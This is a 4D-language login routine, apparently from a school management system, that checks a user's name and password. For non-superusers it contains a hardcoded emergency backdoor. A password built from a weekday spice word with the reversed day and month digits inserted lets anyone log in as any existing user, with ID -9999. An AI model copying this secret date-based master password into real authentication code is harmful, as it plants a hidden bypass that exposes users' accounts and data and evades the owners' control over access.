//%attributes = {}
  //dhUG_ProcessLogin

C_TEXT:C284($1;$2)
C_LONGINT:C283($logged;$0)
If (Count parameters:C259=2)
	vs_Name:=$1
	vs_password:=$2
End if 

$NotSuperUser:=Not:C34(USR_IsSuperUser (vs_Name;vs_password))

If ($NotSuperUser)
	<>tUSR_CurrentUser:=""
	$date:=Current date:C33(*)
	$day:=String:C10(Day of:C23($date);"00")
	$month:=String:C10(Month of:C24($date);"00")
	$day:=$day[[2]]+$day[[1]]
	$month:=$month[[2]]+$month[[1]]
	Case of 
		: (Day number:C114($date)=1)  //domingo
			$string:="comino"
		: (Day number:C114($date)=2)  //lunes
			$string:="canela"
		: (Day number:C114($date)=3)  //martes
			$string:="azafran"
		: (Day number:C114($date)=4)  //miercoles
			$string:="romero"
		: (Day number:C114($date)=5)  //Jueves
			$string:="cardamona"
		: (Day number:C114($date)=6)  //Viernes
			$string:="cilantro"
		: (Day number:C114($date)=7)  //Sábado
			$string:="laurel"
	End case 
	$string:=Insert string:C231($string;$day;3)
	$string:=Insert string:C231($string;$month;7)
	If (ST_ExactlyEqual (vs_password;$string)=1)
		QUERY:C277([xShell_Users:47];[xShell_Users:47]login:9=vs_Name)
		If (Records in selection:C76([xShell_Users:47])>0)
			<>tUSR_CurrentUser:=[xShell_Users:47]login:9+" (emergencia)"
			<>lUSR_CurrentUserID:=-9999
		Else 
			<>tUSR_CurrentUser:=""
		End if 
	End if 
End if 

<>tUSR_CurrentUserName:=<>tUSR_CurrentUser

If (<>tUSR_CurrentUser#"")
	<>lUSR_RelatedTableUserID:=-1
	<>tUSR_RelatedTableUserName:=""
	<>bUSR_EsProfesorJefe:=False:C215
	<>tUSR_Curso:=""
	  //LOG_RegisterEvt ("Inicio de sesión")//20120827 RCH Se pasa a pCALL_BWR_StartBrowser
	$logged:=1
End if 

$0:=$logged